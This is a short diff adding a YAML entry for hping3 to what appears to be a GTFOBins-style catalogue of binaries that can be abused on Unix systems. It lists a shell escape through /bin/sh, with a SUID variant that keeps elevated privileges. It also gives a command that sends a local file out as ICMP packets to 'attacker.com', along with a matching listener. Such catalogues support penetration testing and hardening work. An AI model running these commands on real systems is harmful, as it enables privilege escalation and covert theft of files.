@@ -1,0 +1,27 @@
+---
+functions:
+  shell:
+  - code: |-
+      hping3
+      /bin/sh
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          hping3
+          /bin/sh -p
+        shell: false
+      unprivileged:
+  upload:
+  - code: |-
+      hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
+    comment: |-
+      The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.
+    contexts:
+      sudo:
+    receiver:
+      code: |-
+        hping3 --icmp --listen xxx --dump
+      comment: |-
+        The same program can be used on the attacker box to receive the data.
+...
